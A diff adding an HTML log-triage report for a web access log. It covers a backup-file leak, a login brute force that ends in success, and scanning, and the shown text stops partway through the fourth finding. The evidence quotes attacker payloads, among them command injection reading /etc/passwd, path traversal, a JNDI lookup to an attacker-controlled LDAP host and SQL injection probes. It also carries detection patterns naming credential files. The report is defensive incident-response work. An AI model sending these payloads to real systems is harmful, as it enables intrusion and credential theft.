@@ -1,0 +1,339 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="referrer" content="no-referrer">
+<title>Log triage: access.log</title>
+<style>
+:root {
+  --ink: #16181d; --muted: #5b6370; --line: #e3e5e8; --page: #f6f6f4; --paper: #ffffff; --wash: #f3f4f6;
+  --critical: #b42318; --high: #c2410c; --medium: #946200; --low: #33658a; --info: #5b6370; --ok: #2f6b3a;
+  --sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+  --mono: ui-monospace, "SF Mono", SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace;
+}
+* { box-sizing: border-box; }
+html { -webkit-text-size-adjust: 100%; }
+body { margin: 0; background: var(--page); color: var(--ink); font: 15px/1.55 var(--sans); }
+main { max-width: 1040px; margin: 0 auto; padding: 56px 40px 72px; background: var(--paper); min-height: 100vh;
+  border-left: 1px solid var(--line); border-right: 1px solid var(--line); }
+.top { padding-bottom: 28px; border-bottom: 2px solid var(--ink); margin-bottom: 28px; }
+.kicker { margin: 0 0 10px; color: var(--muted); font-size: 13px; }
+h1 { margin: 0; font-size: 34px; line-height: 1.15; letter-spacing: -0.02em; font-weight: 650; overflow-wrap: anywhere; }
+h1 code { font-size: 0.92em; background: none; padding: 0; }
+.sub { margin: 12px 0 0; color: var(--muted); }
+h2 { margin: 48px 0 14px; font-size: 20px; letter-spacing: -0.01em; }
+h3 { margin: 28px 0 10px; font-size: 16px; }
+p { margin: 0 0 12px; max-width: 76ch; }
+p.muted { color: var(--muted); font-size: 14px; }
+code { font: 13px/1.5 var(--mono); background: var(--wash); padding: 1px 5px; border-radius: 3px; overflow-wrap: anywhere; }
+strong { font-weight: 650; }
+.facts { display: flex; flex-wrap: wrap; gap: 1px; margin: 0; background: var(--line); border: 1px solid var(--line); }
+.facts div { flex: 1 1 200px; padding: 12px 14px; background: var(--paper); min-width: 0; }
+.facts div.wide { flex-basis: 100%; }
+.facts dt { color: var(--muted); font-size: 12.5px; margin-bottom: 2px; }
+.facts dd { margin: 0; font-size: 15px; overflow-wrap: anywhere; }
+.facts dd code { background: none; padding: 0; }
+.scroll { overflow-x: auto; margin: 0 0 16px; }
+table { border-collapse: collapse; width: 100%; font-size: 13.5px; }
+th { text-align: left; font-weight: 600; color: var(--muted); font-size: 12.5px; padding: 7px 10px 7px 0;
+  border-bottom: 1px solid var(--ink); white-space: nowrap; }
+td { padding: 7px 10px 7px 0; border-bottom: 1px solid var(--line); vertical-align: top; }
+td code { background: none; padding: 0; }
+table.wide td { min-width: 72px; }
+figure { margin: 0 0 20px; border: 1px solid var(--line); padding: 8px; }
+figure svg { display: block; width: 100%; height: auto; }
+pre { margin: 0 0 16px; padding: 12px 14px; background: var(--wash); font: 12.5px/1.6 var(--mono); overflow-x: auto;
+  white-space: pre-wrap; overflow-wrap: anywhere; border-left: 2px solid var(--line); }
+.label { margin: 14px 0 6px; color: var(--muted); font-size: 12.5px; }
+.badge { display: inline-block; font-size: 11.5px; font-weight: 650; line-height: 1; padding: 4px 7px 3px;
+  border: 1px solid currentColor; border-radius: 3px; white-space: nowrap; letter-spacing: 0.02em; }
+.tone-critical { --tone: var(--critical); } .tone-high { --tone: var(--high); } .tone-medium { --tone: var(--medium); }
+.tone-low { --tone: var(--low); } .tone-info { --tone: var(--info); } .tone-ok { --tone: var(--ok); }
+.badge { color: var(--tone, var(--muted)); }
+.callout { border-left: 4px solid var(--tone, var(--muted)); background: var(--wash); padding: 16px 18px; margin: 0 0 24px; }
+.callout .verdict { display: block; font-size: 22px; font-weight: 650; letter-spacing: -0.01em; color: var(--tone); margin-bottom: 4px; }
+.callout p { margin: 0; }
+.finding { margin: 0 0 36px; padding: 18px 0 0 18px; border-left: 4px solid var(--tone, var(--muted));
+  border-top: 1px solid var(--line); }
+.finding > header { display: grid; grid-template-columns: auto 1fr; gap: 4px 12px; align-items: baseline; margin-bottom: 12px; }
+.finding > header h3 { margin: 0; font-size: 18px; letter-spacing: -0.01em; }
+.finding > header .meta { grid-column: 2; margin: 0; color: var(--muted); font-size: 13.5px; }
+.finding .num { color: var(--muted); font-variant-numeric: tabular-nums; margin-right: 6px; }
+footer { margin-top: 56px; padding-top: 16px; border-top: 1px solid var(--line); color: var(--muted); font-size: 13px; }
+@media (max-width: 720px) { main { padding: 32px 18px 48px; border: 0; } h1 { font-size: 26px; } }
+@media print {
+  body { background: #fff; font-size: 12px; } main { border: 0; padding: 0; max-width: none; }
+  .finding, figure, table { break-inside: avoid; } pre { white-space: pre-wrap; }
+}
+</style>
+</head>
+<body>
+<main>
+<header class="top"><p class="kicker">Log triage report</p><h1><code>access.log</code></h1><p class="sub">Apache / Nginx access log · 2026-11-10 00:02:21 to 2026-11-10 23:59:01</p></header>
+<div class="callout tone-critical"><span class="verdict">8 findings: 1 critical, 3 high, 3 medium, 1 low</span><p>Start with: <code>203.0.113.99</code> was served <code>/backup.zip</code>; successful responses: 1.</p></div>
+<dl class="facts"><div><dt>Lines read</dt><dd>1 107</dd></div><div><dt>Events parsed</dt><dd>1 105</dd></div><div><dt>Lines skipped</dt><dd>2</dd></div><div><dt>Rules applied</dt><dd>21 from built-in default.yaml</dd></div><div><dt>Clock</dt><dd>as recorded in the log</dd></div><div class="wide"><dt>SHA-256 of the input</dt><dd><code>c8408566adc744c03b5f97889cd17c0805dbb0c094f107466b20181166a5e5eb</code></dd></div></dl>
+<h2>Findings</h2>
+<div class="scroll"><table><thead><tr><th>#</th><th>Severity</th><th>Finding</th><th>Subject</th><th>ATT&amp;CK</th><th>Events</th><th>First seen</th></tr></thead><tbody><tr><td>1</td><td><span class="badge tone-critical">CRITICAL</span></td><td>Secret or backup file was served to a client</td><td><code>203.0.113.99</code></td><td><code>T1552.001</code></td><td>1</td><td>2026-11-10 03:13:41</td></tr><tr><td>2</td><td><span class="badge tone-high">HIGH</span></td><td>Repeated refused logins on a web form</td><td><code>198.51.100.177</code></td><td><code>T1110.001</code></td><td>64</td><td>2026-11-10 11:40:12</td></tr><tr><td>3</td><td><span class="badge tone-high">HIGH</span></td><td>Injection or path traversal pattern in a request</td><td><code>203.0.113.99</code></td><td><code>T1190</code></td><td>13</td><td>2026-11-10 03:20:49</td></tr><tr><td>4</td><td><span class="badge tone-high">HIGH</span></td><td>Login form accepted a client after repeated refusals</td><td><code>198.51.100.177</code></td><td><code>T1110</code></td><td>1</td><td>2026-11-10 11:45:30</td></tr><tr><td>5</td><td><span class="badge tone-medium">MEDIUM</span></td><td>Burst of 404 responses to one client</td><td><code>203.0.113.99</code></td><td><code>T1595.003</code></td><td>43</td><td>2026-11-10 03:12:07</td></tr><tr><td>6</td><td><span class="badge tone-medium">MEDIUM</span></td><td>Burst of HTTP 5xx responses</td><td>—</td><td><code>T1190</code></td><td>43</td><td>2026-11-10 03:20:41</td></tr><tr><td>7</td><td><span class="badge tone-medium">MEDIUM</span></td><td>Probing for admin panels and secret files</td><td><code>203.0.113.99</code></td><td><code>T1595.003</code></td><td>30</td><td>2026-11-10 03:12:07</td></tr><tr><td>8</td><td><span class="badge tone-low">LOW</span></td><td>Request from a known scanning tool</td><td><code>203.0.113.99</code></td><td><code>T1595.002</code></td><td>60</td><td>2026-11-10 03:12:07</td></tr></tbody></table></div>
+<h2>Timeline and sources</h2>
+<figure><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 960 280" width="960" height="280" role="img" aria-label="Events over time, 30 min per bar" font-family="-apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif" font-size="12">
+<title>Events over time, 30 min per bar</title>
+<rect width="960" height="280" fill="#ffffff"/>
+<text x="20" y="24" font-size="14" font-weight="600" fill="#16181d">Events over time, 30 min per bar</text>
+<text x="940" y="24" text-anchor="end" fill="#5b6370">other events</text>
+<rect x="847" y="14" width="10" height="10" fill="#b4bcc8"/>
+<text x="829" y="24" text-anchor="end" fill="#5b6370">failed or refused</text>
+<rect x="704" y="14" width="10" height="10" fill="#c2410c"/>
+<line x1="56" x2="940" y1="240.0" y2="240.0" stroke="#e6e8eb"/>
+<text x="48" y="244.0" text-anchor="end" fill="#5b6370">0</text>
+<line x1="56" x2="940" y1="145.0" y2="145.0" stroke="#e6e8eb"/>
+<text x="48" y="149.0" text-anchor="end" fill="#5b6370">50</text>
+<line x1="56" x2="940" y1="50.0" y2="50.0" stroke="#e6e8eb"/>
+<text x="48" y="54.0" text-anchor="end" fill="#5b6370">100</text>
+<rect x="56.0" y="234.3" width="17.4" height="5.7" fill="#b4bcc8"/>
+<rect x="74.4" y="224.8" width="17.4" height="15.2" fill="#b4bcc8"/>
+<rect x="111.2" y="236.2" width="17.4" height="3.8" fill="#b4bcc8"/>
+<rect x="129.7" y="236.2" width="17.4" height="3.8" fill="#b4bcc8"/>
+<rect x="148.1" y="234.3" width="17.4" height="5.7" fill="#b4bcc8"/>
+<rect x="166.5" y="124.1" width="17.4" height="9.5" fill="#b4bcc8"/>
+<rect x="166.5" y="133.6" width="17.4" height="106.4" fill="#c2410c"/>
+<rect x="184.9" y="236.2" width="17.4" height="3.8" fill="#b4bcc8"/>
+<rect x="203.3" y="234.3" width="17.4" height="5.7" fill="#b4bcc8"/>
+<rect x="221.8" y="234.3" width="17.4" height="5.7" fill="#b4bcc8"/>
+<rect x="240.2" y="232.4" width="17.4" height="5.7" fill="#b4bcc8"/>
+<rect x="240.2" y="238.1" width="17.4" height="1.9" fill="#c2410c"/>
+<rect x="258.6" y="234.3" width="17.4" height="5.7" fill="#b4bcc8"/>
+<rect x="277.0" y="232.4" width="17.4" height="7.6" fill="#b4bcc8"/>
+<rect x="295.4" y="219.1" width="17.4" height="20.9" fill="#b4bcc8"/>
+<rect x="313.8" y="213.4" width="17.4" height="26.6" fill="#b4bcc8"/>
+<rect x="332.2" y="202.0" width="17.4" height="38.0" fill="#b4bcc8"/>
+<rect x="350.7" y="207.7" width="17.4" height="28.5" fill="#b4bcc8"/>
+<rect x="350.7" y="236.2" width="17.4" height="3.8" fill="#c2410c"/>
+<rect x="369.1" y="198.2" width="17.4" height="38.0" fill="#b4bcc8"/>
+<rect x="369.1" y="236.2" width="17.4" height="3.8" fill="#c2410c"/>
+<rect x="387.5" y="164.0" width="17.4" height="76.0" fill="#b4bcc8"/>
+<rect x="405.9" y="205.8" width="17.4" height="32.3" fill="#b4bcc8"/>
+<rect x="405.9" y="238.1" width="17.4" height="1.9" fill="#c2410c"/>
+<rect x="424.3" y="179.2" width="17.4" height="57.0" fill="#b4bcc8"/>
+<rect x="424.3" y="236.2" width="17.4" height="3.8" fill="#c2410c"/>
+<rect x="442.8" y="158.3" width="17.4" height="79.8" fill="#b4bcc8"/>
+<rect x="442.8" y="238.1" width="17.4" height="1.9" fill="#c2410c"/>
+<rect x="461.2" y="169.7" width="17.4" height="70.3" fill="#b4bcc8"/>
+<rect x="479.6" y="51.9" width="17.4" height="66.5" fill="#b4bcc8"/>
+<rect x="479.6" y="118.4" width="17.4" height="121.6" fill="#c2410c"/>
+<rect x="498.0" y="177.3" width="17.4" height="62.7" fill="#b4bcc8"/>
+<rect x="516.4" y="181.1" width="17.4" height="57.0" fill="#b4bcc8"/>
+<rect x="516.4" y="238.1" width="17.4" height="1.9" fill="#c2410c"/>
+<rect x="534.8" y="183.0" width="17.4" height="51.3" fill="#b4bcc8"/>
+<rect x="534.8" y="234.3" width="17.4" height="5.7" fill="#c2410c"/>
+<rect x="553.2" y="194.4" width="17.4" height="43.7" fill="#b4bcc8"/>
+<rect x="553.2" y="238.1" width="17.4" height="1.9" fill="#c2410c"/>
+<rect x="571.7" y="103.2" width="17.4" height="64.6" fill="#b4bcc8"/>
+<rect x="571.7" y="167.8" width="17.4" height="72.2" fill="#c2410c"/>
+<rect x="590.1" y="183.0" width="17.4" height="53.2" fill="#b4bcc8"/>
+<rect x="590.1" y="236.2" width="17.4" height="3.8" fill="#c2410c"/>
+<rect x="608.5" y="192.5" width="17.4" height="45.6" fill="#b4bcc8"/>
+<rect x="608.5" y="238.1" width="17.4" height="1.9" fill="#c2410c"/>
+<rect x="626.9" y="196.3" width="17.4" height="41.8" fill="#b4bcc8"/>
+<rect x="626.9" y="238.1" width="17.4" height="1.9" fill="#c2410c"/>
+<rect x="645.3" y="184.9" width="17.4" height="51.3" fill="#b4bcc8"/>
+<rect x="645.3" y="236.2" width="17.4" height="3.8" fill="#c2410c"/>
+<rect x="663.8" y="171.6" width="17.4" height="66.5" fill="#b4bcc8"/>
+<rect x="663.8" y="238.1" width="17.4" height="1.9" fill="#c2410c"/>
+<rect x="682.2" y="188.7" width="17.4" height="51.3" fill="#b4bcc8"/>
+<rect x="700.6" y="171.6" width="17.4" height="66.5" fill="#b4bcc8"/>
+<rect x="700.6" y="238.1" width="17.4" height="1.9" fill="#c2410c"/>
+<rect x="719.0" y="164.0" width="17.4" height="76.0" fill="#b4bcc8"/>
+<rect x="737.4" y="181.1" width="17.4" height="55.1" fill="#b4bcc8"/>
+<rect x="737.4" y="236.2" width="17.4" height="3.8" fill="#c2410c"/>
+<rect x="755.8" y="183.0" width="17.4" height="55.1" fill="#b4bcc8"/>
+<rect x="755.8" y="238.1" width="17.4" height="1.9" fill="#c2410c"/>
+<rect x="774.2" y="177.3" width="17.4" height="62.7" fill="#b4bcc8"/>
+<rect x="792.7" y="200.1" width="17.4" height="38.0" fill="#b4bcc8"/>
+<rect x="792.7" y="238.1" width="17.4" height="1.9" fill="#c2410c"/>
+<rect x="811.1" y="203.9" width="17.4" height="36.1" fill="#b4bcc8"/>
+<rect x="829.5" y="196.3" width="17.4" height="43.7" fill="#b4bcc8"/>
+<rect x="847.9" y="196.3" width="17.4" height="39.9" fill="#b4bcc8"/>
+<rect x="847.9" y="236.2" width="17.4" height="3.8" fill="#c2410c"/>
+<rect x="866.3" y="224.8" width="17.4" height="15.2" fill="#b4bcc8"/>
+<rect x="884.8" y="205.8" width="17.4" height="32.3" fill="#b4bcc8"/>
+<rect x="884.8" y="238.1" width="17.4" height="1.9" fill="#c2410c"/>
+<rect x="903.2" y="232.4" width="17.4" height="7.6" fill="#b4bcc8"/>
+<rect x="921.6" y="224.8" width="17.4" height="13.3" fill="#b4bcc8"/>
+<rect x="921.6" y="238.1" width="17.4" height="1.9" fill="#c2410c"/>
+<text x="56.0" y="264" text-anchor="start" fill="#5b6370">10 Nov 00:00</text>
+<text x="231.0" y="264" text-anchor="middle" fill="#5b6370">10 Nov 04:30</text>
+<text x="415.1" y="264" text-anchor="middle" fill="#5b6370">10 Nov 09:30</text>
+<text x="580.9" y="264" text-anchor="middle" fill="#5b6370">10 Nov 14:00</text>
+<text x="765.0" y="264" text-anchor="middle" fill="#5b6370">10 Nov 19:00</text>
+<text x="940.0" y="264" text-anchor="end" fill="#5b6370">10 Nov 23:30</text>
+</svg></figure>
+<figure><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 960 320" width="960" height="320" role="img" aria-label="Busiest source addresses" font-family="-apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif" font-size="12">
+<title>Busiest source addresses</title>
+<rect width="960" height="320" fill="#ffffff"/>
+<text x="20" y="24" font-size="14" font-weight="600" fill="#16181d">Busiest source addresses</text>
+<text x="940" y="24" text-anchor="end" fill="#5b6370">other events</text>
+<rect x="847" y="14" width="10" height="10" fill="#b4bcc8"/>
+<text x="829" y="24" text-anchor="end" fill="#5b6370">failed or refused</text>
+<rect x="704" y="14" width="10" height="10" fill="#c2410c"/>
+<text x="130" y="61" text-anchor="end" font-family="ui-monospace, 'SF Mono', Menlo, Consolas, monospace" fill="#16181d">198.51.100.177</text>
+<rect x="142.2" y="50" width="19.1" height="16" fill="#b4bcc8"/>
+<rect x="161.3" y="50" width="612.3" height="16" fill="#c2410c"/>
+<text x="781.6" y="62" fill="#5b6370">66, 64 failed or refused</text>
+<text x="130" y="87" text-anchor="end" font-family="ui-monospace, 'SF Mono', Menlo, Consolas, monospace" fill="#16181d">203.0.113.99</text>
+<rect x="142.2" y="76" width="38.3" height="16" fill="#b4bcc8"/>
+<rect x="180.5" y="76" width="535.7" height="16" fill="#c2410c"/>
+<text x="724.2" y="88" fill="#5b6370">60, 56 failed or refused</text>
+<text x="130" y="113" text-anchor="end" font-family="ui-monospace, 'SF Mono', Menlo, Consolas, monospace" fill="#16181d">198.51.100.14</text>
+<rect x="142.2" y="102" width="440.1" height="16" fill="#b4bcc8"/>
+<rect x="582.3" y="102" width="57.4" height="16" fill="#c2410c"/>
+<text x="647.7" y="114" fill="#5b6370">52, 6 failed or refused</text>
+<text x="130" y="139" text-anchor="end" font-family="ui-monospace, 'SF Mono', Menlo, Consolas, monospace" fill="#16181d">192.0.2.63</text>
+<rect x="142.2" y="128" width="411.4" height="16" fill="#b4bcc8"/>
+<rect x="553.6" y="128" width="28.7" height="16" fill="#c2410c"/>
+<text x="590.3" y="140" fill="#5b6370">46, 3 failed or refused</text>
+<text x="130" y="165" text-anchor="end" font-family="ui-monospace, 'SF Mono', Menlo, Consolas, monospace" fill="#16181d">198.51.100.24</text>
+<rect x="142.2" y="154" width="373.1" height="16" fill="#b4bcc8"/>
+<rect x="515.3" y="154" width="19.1" height="16" fill="#c2410c"/>
+<text x="542.4" y="166" fill="#5b6370">41, 2 failed or refused</text>
+<text x="130" y="191" text-anchor="end" font-family="ui-monospace, 'SF Mono', Menlo, Consolas, monospace" fill="#16181d">192.0.2.11</text>
+<rect x="142.2" y="180" width="354.0" height="16" fill="#b4bcc8"/>
+<rect x="496.2" y="180" width="9.6" height="16" fill="#c2410c"/>
+<text x="513.7" y="192" fill="#5b6370">38, 1 failed or refused</text>
+<text x="130" y="217" text-anchor="end" font-family="ui-monospace, 'SF Mono', Menlo, Consolas, monospace" fill="#16181d">192.0.2.79</text>
+<rect x="142.2" y="206" width="334.8" height="16" fill="#b4bcc8"/>
+<rect x="477.0" y="206" width="19.1" height="16" fill="#c2410c"/>
+<text x="504.2" y="218" fill="#5b6370">37, 2 failed or refused</text>
+<text x="130" y="243" text-anchor="end" font-family="ui-monospace, 'SF Mono', Menlo, Consolas, monospace" fill="#16181d">192.0.2.2</text>
+<rect x="142.2" y="232" width="315.7" height="16" fill="#b4bcc8"/>
+<rect x="457.9" y="232" width="28.7" height="16" fill="#c2410c"/>
+<text x="494.6" y="244" fill="#5b6370">36, 3 failed or refused</text>
+<text x="130" y="269" text-anchor="end" font-family="ui-monospace, 'SF Mono', Menlo, Consolas, monospace" fill="#16181d">192.0.2.80</text>
+<rect x="142.2" y="258" width="267.9" height="16" fill="#b4bcc8"/>
+<rect x="410.1" y="258" width="19.1" height="16" fill="#c2410c"/>
+<text x="437.2" y="270" fill="#5b6370">30, 2 failed or refused</text>
+<text x="130" y="295" text-anchor="end" font-family="ui-monospace, 'SF Mono', Menlo, Consolas, monospace" fill="#16181d">198.51.100.89</text>
+<rect x="142.2" y="284" width="258.3" height="16" fill="#b4bcc8"/>
+<rect x="400.5" y="284" width="19.1" height="16" fill="#c2410c"/>
+<text x="427.6" y="296" fill="#5b6370">29, 2 failed or refused</text>
+</svg></figure>
+<h2>Details</h2>
+<section class="finding tone-critical"><header><span class="badge">CRITICAL</span><h3><span class="num">1.</span>Secret or backup file was served to a client</h3><p class="meta"><code>T1552.001</code> Unsecured Credentials: Credentials In Files · Credential Access · 1 event · 2026-11-10 03:13:41 to 2026-11-10 03:13:41</p></header>
+<p><strong>What was seen. </strong><code>203.0.113.99</code> was served <code>/backup.zip</code>; successful responses: 1</p>
+<p>The server answered 200 to a request for a file that normally holds secrets or a copy of the site: .env, .git, key files, dumps and archives.</p>
+<p><strong>Why it fired. </strong><code>event = http_request and status in [200, 206] and path matches /(^|/)(\.env(\.[\w-]+)?|\.git/(config|HEAD|index)|\.htpasswd|\.aws/credentials|id_rsa|id…/</code>; every matching event per ip.</p>
+<p class="muted">Evidence</p>
+<div class="scroll"><table class="wide"><thead><tr><th>Line</th><th>Time</th><th>Host</th><th>User</th><th>IP</th><th>Event</th><th>Result</th><th>Path</th><th>Status</th></tr></thead><tbody><tr><td>52</td><td>2026-11-10 03:13:41</td><td>—</td><td>—</td><td><code>203.0.113.99</code></td><td><code>http_request</code></td><td><code>success</code></td><td><code>/backup.zip</code></td><td><code>200</code></td></tr></tbody></table></div>
+<p class="label">Raw lines</p><pre>52: 203.0.113.99 - - [10/Nov/2026:03:13:41 +0500] &quot;GET /backup.zip HTTP/1.1&quot; 200 48211433 &quot;-&quot; &quot;Mozilla/5.0 zgrab/0.x&quot;</pre>
+<p><strong>What to check. </strong>Remove the file from the web root now. Rotate every secret it contains and assume the content is known to the client that fetched it.</p>
+<p class="muted">Rule web-secret-file-served from built-in default.yaml. Technique: https://attack.mitre.org/techniques/T1552/001/</p>
+</section>
+<section class="finding tone-high"><header><span class="badge">HIGH</span><h3><span class="num">2.</span>Repeated refused logins on a web form</h3><p class="meta"><code>T1110.001</code> Brute Force: Password Guessing · Credential Access · 64 events · 2026-11-10 11:40:12 to 2026-11-10 11:45:24</p></header>
+<p><strong>What was seen. </strong>64 refused logins from <code>198.51.100.177</code> on <code>/login</code>, up to 62 within 5 min</p>
+<p>One client sent many POST requests to a login path and was refused each time. Only 401, 403 and 429 count: applications that answer 200 to a wrong password need their own rule.</p>
+<p><strong>Why it fired. </strong><code>event = http_request and method = POST and status in [401, 403, 429] and path matches /(^|/)(login|log-in|signin|sign-in|wp-login\.php|auth|session|token)(/|\.|$)/</code>; at least 20 matching events within 5 min per ip.</p>
+<p class="muted">Evidence: 5 of 64 matching events</p>
+<div class="scroll"><table class="wide"><thead><tr><th>Line</th><th>Time</th><th>Host</th><th>User</th><th>IP</th><th>Event</th><th>Result</th><th>Method</th><th>Path</th><th>Status</th></tr></thead><tbody><tr><td>368</td><td>2026-11-10 11:40:12</td><td>—</td><td>—</td><td><code>198.51.100.177</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>POST</code></td><td><code>/login</code></td><td><code>401</code></td></tr><tr><td>369</td><td>2026-11-10 11:40:19</td><td>—</td><td>—</td><td><code>198.51.100.177</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>POST</code></td><td><code>/login</code></td><td><code>401</code></td></tr><tr><td>370</td><td>2026-11-10 11:40:23</td><td>—</td><td>—</td><td><code>198.51.100.177</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>POST</code></td><td><code>/login</code></td><td><code>401</code></td></tr><tr><td>371</td><td>2026-11-10 11:40:30</td><td>—</td><td>—</td><td><code>198.51.100.177</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>POST</code></td><td><code>/login</code></td><td><code>401</code></td></tr><tr><td>372</td><td>2026-11-10 11:40:34</td><td>—</td><td>—</td><td><code>198.51.100.177</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>POST</code></td><td><code>/login</code></td><td><code>401</code></td></tr></tbody></table></div>
+<p class="label">Raw lines</p><pre>368: 198.51.100.177 - - [10/Nov/2026:11:40:12 +0500] &quot;POST /login HTTP/1.1&quot; 401 482 &quot;https://shop.example/login&quot; &quot;python-requests/2.32.5&quot;
+369: 198.51.100.177 - - [10/Nov/2026:11:40:19 +0500] &quot;POST /login HTTP/1.1&quot; 401 482 &quot;https://shop.example/login&quot; &quot;python-requests/2.32.5&quot;
+370: 198.51.100.177 - - [10/Nov/2026:11:40:23 +0500] &quot;POST /login HTTP/1.1&quot; 401 482 &quot;https://shop.example/login&quot; &quot;python-requests/2.32.5&quot;
+371: 198.51.100.177 - - [10/Nov/2026:11:40:30 +0500] &quot;POST /login HTTP/1.1&quot; 401 482 &quot;https://shop.example/login&quot; &quot;python-requests/2.32.5&quot;
+372: 198.51.100.177 - - [10/Nov/2026:11:40:34 +0500] &quot;POST /login HTTP/1.1&quot; 401 482 &quot;https://shop.example/login&quot; &quot;python-requests/2.32.5&quot;</pre>
+<p><strong>What to check. </strong>Check for a successful login from this client afterwards. Add rate limiting or a lockout on the login endpoint.</p>
+<p class="muted">Rule web-login-bruteforce from built-in default.yaml. Technique: https://attack.mitre.org/techniques/T1110/001/</p>
+</section>
+<section class="finding tone-high"><header><span class="badge">HIGH</span><h3><span class="num">3.</span>Injection or path traversal pattern in a request</h3><p class="meta"><code>T1190</code> Exploit Public-Facing Application · Initial Access · 13 events · 2026-11-10 03:20:49 to 2026-11-10 03:21:52</p></header>
+<p><strong>What was seen. </strong>Requests with attack payloads from <code>203.0.113.99</code>: 13; examples: <code>/api/cart?item=1;cat /etc/passwd, /download?file=....//....//etc/passwd, /download?file=../../../../etc/passwd, /download?file=/proc/self/environ, /product?id=${jndi:ldap://203.0.113.99/a} and 8 more</code></p>
+<p>Request targets contain payloads for path traversal, SQL injection, command injection or JNDI lookups.</p>
+<p><strong>Why it fired. </strong><code>event = http_request and target matches /\.\./|\.\.\\|%2e%2e[/%] | /etc/passwd|/proc/self/environ|win\.ini | union[\s+]+(all[\s+…/</code>; every matching event per ip.</p>
+<p class="muted">Evidence: 5 of 13 matching events</p>
+<div class="scroll"><table class="wide"><thead><tr><th>Line</th><th>Time</th><th>Host</th><th>User</th><th>IP</th><th>Event</th><th>Result</th><th>Target</th></tr></thead><tbody><tr><td>67</td><td>2026-11-10 03:20:49</td><td>—</td><td>—</td><td><code>203.0.113.99</code></td><td><code>http_request</code></td><td><code>success</code></td><td><code>/product?id=1&#x27; OR &#x27;1&#x27;=&#x27;1</code></td></tr><tr><td>68</td><td>2026-11-10 03:20:53</td><td>—</td><td>—</td><td><code>203.0.113.99</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>/product?id=1&#x27; UNION SELECT NULL--</code></td></tr><tr><td>69</td><td>2026-11-10 03:20:56</td><td>—</td><td>—</td><td><code>203.0.113.99</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>/product?id=1&#x27; UNION SELECT NULL,NULL--</code></td></tr><tr><td>70</td><td>2026-11-10 03:20:59</td><td>—</td><td>—</td><td><code>203.0.113.99</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>/product?id=1&#x27; UNION SELECT NULL,NULL,NULL--</code></td></tr><tr><td>71</td><td>2026-11-10 03:21:08</td><td>—</td><td>—</td><td><code>203.0.113.99</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>/product?id=1 AND SLEEP(5)</code></td></tr></tbody></table></div>
+<p class="label">Raw lines</p><pre>67: 203.0.113.99 - - [10/Nov/2026:03:20:49 +0500] &quot;GET /product?id=1%27%20OR%20%271%27=%271 HTTP/1.1&quot; 200 12728 &quot;-&quot; &quot;sqlmap/1.9.4#stable (https://sqlmap.org)&quot;
+68: 203.0.113.99 - - [10/Nov/2026:03:20:53 +0500] &quot;GET /product?id=1%27%20UNION%20SELECT%20NULL-- HTTP/1.1&quot; 500 8085 &quot;-&quot; &quot;sqlmap/1.9.4#stable (https://sqlmap.org)&quot;
+69: 203.0.113.99 - - [10/Nov/2026:03:20:56 +0500] &quot;GET /product?id=1%27%20UNION%20SELECT%20NULL,NULL-- HTTP/1.1&quot; 500 16214 &quot;-&quot; &quot;sqlmap/1.9.4#stable (https://sqlmap.org)&quot;
+70: 203.0.113.99 - - [10/Nov/2026:03:20:59 +0500] &quot;GET /product?id=1%27%20UNION%20SELECT%20NULL,NULL,NULL-- HTTP/1.1&quot; 500 19000 &quot;-&quot; &quot;sqlmap/1.9.4#stable (https://sqlmap.org)&quot;
+71: 203.0.113.99 - - [10/Nov/2026:03:21:08 +0500] &quot;GET /product?id=1%20AND%20SLEEP(5) HTTP/1.1&quot; 500 11442 &quot;-&quot; &quot;sqlmap/1.9.4#stable (https://sqlmap.org)&quot;</pre>
+<p><strong>What to check. </strong>Look at the status codes: a 200 on such a request needs a manual check of what the application returned. Patch or add a WAF rule for the parameter.</p>
+<p class="muted">Rule web-injection-attempt from built-in default.yaml. Technique: https://attack.mitre.org/techniques/T1190/</p>
+</section>
+<section class="finding tone-high"><header><span class="badge">HIGH</span><h3><span class="num">4.</span>Login form accepted a client after repeated refusals</h3><p class="meta"><code>T1110</code> Brute Force · Credential Access · 1 event · 2026-11-10 11:45:30 to 2026-11-10 11:45:30</p></header>
+<p><strong>What was seen. </strong><code>198.51.100.177</code> was accepted on <code>/login</code> after 64 refused logins within 30 min</p>
+<p>A client that had just been refused on a login path many times then got a redirect or a 200 from the same path. On most applications that means the password was found.</p>
+<p><strong>Why it fired. </strong><code>event = http_request and method = POST and status in [200, 302, 303] and path matches /(^|/)(login|log-in|signin|sign-in|wp-login\.php|auth|session|token)(/|\.|$)/</code>; a matching event preceded within 30 min by at least 10 events per ip where method = POST and status in [401, 403, 429] and path matches /(^|/)(login|log-in|signin|sign-in|wp-login\.php|auth|session|token)(/|\.|$)/.</p>
+<p class="muted">Evidence</p>
+<div class="scroll"><table class="wide"><thead><tr><th>Line</th><th>Time</th><th>Host</th><th>User</th><th>IP</th><th>Event</th><th>Result</th><th>Method</th><th>Path</th><th>Status</th></tr></thead><tbody><tr><td>438</td><td>2026-11-10 11:45:18</td><td>—</td><td>—</td><td><code>198.51.100.177</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>POST</code></td><td><code>/login</code></td><td><code>401</code></td></tr><tr><td>439</td><td>2026-11-10 11:45:24</td><td>—</td><td>—</td><td><code>198.51.100.177</code></td><td><code>http_request</code></td><td><code>failure</code></td><td><code>POST</code></td><td><code>/login</code></td><td><code>401</code></td></tr><tr><td>440</td><td>2026-11-10 11:45:30</td><td>—</td><td>—</td><td><code>198.51.100.177</code></td><td><code>http_request</code></td><td><code>success</code></td><td><code>POST</code></td><td><code>/login</code></td><td><code>302</code></td></tr></tbody></table></div>
